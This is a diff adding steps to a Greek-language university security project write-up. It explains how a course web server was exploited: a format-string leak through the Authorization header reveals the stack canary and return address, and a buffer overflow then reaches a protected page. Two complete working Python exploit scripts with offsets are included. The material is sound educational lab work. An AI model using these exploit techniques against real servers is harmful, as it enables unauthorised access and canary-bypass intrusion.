@@ -398,7 +398,7 @@
    ή κάνοντας brute force.
    
    Μέσω του gdb και μετά από σχετική αναζήτηση, βρήκαμε ότι τα συγκεκριμένα canaries είναι **Random Terminator Canaries** και έτσι καταλάβαμε το
-   πως λειτουργούν και πως θα μπορούσαμε να τα κάνουμε bypass. [<sup>\[9\]</sup>](#9--httpsenwikipediaorgwikiBuffer_overflow_protectioncanaries)[<sup>\[10\]</sup>](#10--httpswwwusenixorglegacypublicationslibraryproceedingssec98full_paperscowancowanpdf)[<sup>\[11\]</sup>](#11--httpstaffustceducnbjhuacoursessecurity2014readingsstackguard-bypasspdf)
+   πως λειτουργούν και πως θα μπορούσαμε να τα κάνουμε bypass. [<sup>\[9\]</sup>](#9--httpsenwikipediaorgwikiBuffer_overflow_protectioncanaries)[<sup>\[10\]</sup>](#10--httpswwwusenixorglegacypublicationslibraryproceedingssec98full_paperscowancowanpdf)[<sup>\[11\]</sup>](#11--httpstaffustceducnbjhuacoursessecurity2014readingsstackguard-bypasspdf)[<sup>\[12\]</sup>](#12--httpsuafioexploitation20150929Stack-CANARY-Overwrite-Primerhtml)
    
    Βρήκαμε δηλαδή ότι παράγονται κατά το initialization του server και παραμένει ίδιο για κάθε κλήση συνάρτησης που περιέχει κάποιον πίνακα.
    
@@ -421,7 +421,172 @@
 
 <br/>
 
-9. 
+9. Επειτα, υπολογίσαμε το offset της διεύθυνσης της εντολής που καλεί την **`serve_ultimate()`** από την πραγματική _return address_ της `check_auth()`, 
+   το οποίο είναι ίσο με: **0x145**. _(Παρακάτω παρατίθεται και ο σχετικός κώδικας που κάνει το attack)_
+   
+   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/22-Check_Auth_Ret.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/23-Call_Serve_Ultimate.png)|
+   |-|-|
+   
+   Στην αρχή πηγαίναμε στο Tor και παίρναμε τα δεδομένα που χρειαζόμασταν μέσω του **FSA**, έπειτα φτιάχναμε το payload σε binary μορφή, το αποθηκεύαμε 
+   σε αρχείο και χρησιμοποιούσαμε το **Postman** για να κάνουμε το request, αλλά στη συνέχεια αυτοματοποιήσαμε όλη τη διαδικασία φτιάχνοντας ένα python script.
+   
+   ```python
+   ...
+   binary_payload = BytesIO()
+   binary_payload.write(("p" * 100).encode("utf-8"))
+   binary_payload.write(canary)
+   binary_payload.write(("p" * 8).encode("utf-8"))
+   binary_payload.write(svd_ebp)
+   binary_payload.write(srv_ulti)
+   ...
+   ```
+   
+   <details>
+   <summary><b>Click here to see the full script</b></summary>
+      <p>
+
+      ```python
+      import struct
+      import base64
+      import requests
+
+      from sys import argv
+      from io  import BytesIO
+
+      # Sending 1st payload to / for getting the canary value and
+      # the return address of check_auth() from reposnse headers
+      url = 'http://localhost:' + argv[1] + '/'
+
+      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
+      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
+      response = requests.request("GET", url, headers=input_headers)
+      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+
+      # Building the payload
+      canary   = text_obj[-3]
+      ebp      = text_obj[-2]
+      ret_addr = text_obj[-1]
+
+      offset_srv_ulti = 0x145
+
+      canary   = struct.pack('<L', int(canary  , base=16))
+      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
+      srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
+
+      binary_payload = BytesIO()
+      binary_payload.write(("p" * 100).encode("utf-8"))
+      binary_payload.write(canary)
+      binary_payload.write(("p" * 8).encode("utf-8"))
+      binary_payload.write(svd_ebp)
+      binary_payload.write(srv_ulti)
+
+      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
+      url = 'http://localhost:' + argv[1] + '/ultimate.html'
+      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
+      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
+      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
+
+      print(response.text)
+      ```
+
+      </p>
+   </details>
+<br/>
+
+10. Ωστόσο, παρατηρήσαμε ότι καθυστερεί υπερβολικά να στείλει την απάντηση και τρέχοντας το τοπικά, είδαμε ότι αλλάζοντας απλά το return 
+    address της `check_auth()` ώστε να πάει κατευθείαν στην **κλήση** της **`serve_ultimate()`**, τότε προκύπτει **SIGSEGV**, το οποίο οφείλεται 
+    στο ότι η `serve_ultimate()` επιστρέφει κανονικά στην **`route()`** και όταν φτάνει στη γραμμή main.c:**63** όπου γίνεται το **`free()`**, 
+    το όρισμα της (**given_pwd**) που θα αρχικοποιούνταν αμέσως μετά την κανονική επιστροφή της `post_param()`, δεν έχει γίνει τελικά και έτσι
+    έχοντας μια τυχαία τιμή προκύπτει το ***segmentation fault***.
+    
+    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/24-Serve_Ultimate_SIGSEGV.png)
+    
+    Κάνοντας kill το process που εξυπηρετούσε το τρέχον request, στέλνεται το περιεχόμενο του _ultimate.html_, κάτι που σημαίνει ότι έχουν σταλεί 
+    τα δεδομένα στο pipeline, αλλά δεν έχει γίνει flush ο buffer του stdout και γι'αυτό δεν έρχονται άμεσα οι απαντήσεις.    
+<br/>
+
+11. Έτσι, βρήκαμε έναν εναλλακτικό τρόπο να πάρουμε το αρχείο χωρίς να χαλάσει η ροή της υπόλοιπης εκτέλεσης. 
+
+    Υπολογίσαμε νέα offsets μεταξύ της πρώτης εντολής της **`serve_ultimate()`** και της πραγματικής return address της `check_auth()` έτσι ώστε 
+    να μπορέσουμε να ελέγξουμε και το που θα επιστρέψει η `serve_ultimate()` μόλις ολοκληρωθεί, κάτι που δε γίνεται αν χρησιμοποιήσουμε την κλήση 
+    της συνάρτησης μέσω της εντολής `call`, γιατί η εντολή αυτή κάνει push το πραγματικό return address της εκάστοτε συνάρτησης που καλεί, κάτι 
+    που δεν μπορούμε να αλλάξουμε, εφόσον γίνεται σε μεταγενέστερο χρόνο από το BOF.
+ 
+    |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
+    |-|-|
+    |1η εντολή της `serve_ultimate()` | **0x870** |
+    |Επιστροφή της `serve_ultimate()` παρακάμπτοντας την `free()` | **0x169**|
+    
+    ```python
+    ...
+    binary_payload = BytesIO()
+    binary_payload.write(("p" * 100).encode("utf-8"))
+    binary_payload.write(canary)
+    binary_payload.write(("p" * 8).encode("utf-8"))
+    binary_payload.write(svd_ebp)
+    binary_payload.write(srv_ulti)
+    binary_payload.write(safe_ret)
+    ...
+    ```
+    <details>
+    <summary><b>Click here to see the full script</b></summary>
+       <p>
+
+       ```python
+       import pycurl
+       import struct
+       import base64
+       import requests
+ 
+       from sys import argv
+       from io  import BytesIO
+ 
+       # Sending 1st payload to / for getting the canary value and
+       # the return address of check_auth() from reposnse headers
+       url = 'http://localhost:' + argv[1] + '/'
+ 
+       username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
+       input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
+       response = requests.request("GET", url, headers=input_headers)
+       text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+ 
+       # Building the payload
+       canary   = text_obj[-3]
+       ebp      = text_obj[-2]
+       ret_addr = text_obj[-1]
+      
+       offset_srv_ulti = 0x870
+       offset_safe_ret = 0x169 
+ 
+       canary   = struct.pack('<L', int(canary  , base=16))
+       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
+       srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
+       safe_ret = struct.pack('<L', int(ret_addr, base=16) + offset_safe_ret)
+ 
+       binary_payload = BytesIO()
+       binary_payload.write(("p" * 100).encode("utf-8"))
+       binary_payload.write(canary)
+       binary_payload.write(("p" * 8).encode("utf-8"))
+       binary_payload.write(svd_ebp)
+       binary_payload.write(srv_ulti)
+       binary_payload.write(safe_ret)
+ 
+       # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
+       url = 'http://localhost:' + argv[1] + '/ultimate.html'
+       authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
+       headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
+       response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
+ 
+       print(response.text)
+       ```
+ 
+       </p>
+    </details><br/>
+    Ετσι, πετύχαμε να παίρνουμε το _ultimate.html_ άμεσα και να κάνουμε το παιδί να τερματίζει ομαλά χωρίς να αφήνουμε κάποιο ίχνος όπως ένα segmentation fault.
+    
+    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/25-Ultimate_Data.png)
+
+
    
    
 
@@ -438,3 +603,4 @@
 <h5><sup>[9]</sup>  https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries</h5>
 <h5><sup>[10]</sup>  https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf</h5>
 <h5><sup>[11]</sup>  http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf</h5>
+<h5><sup>[12]</sup>  https://uaf.io/exploitation/2015/09/29/Stack-CANARY-Overwrite-Primer.html</h5>
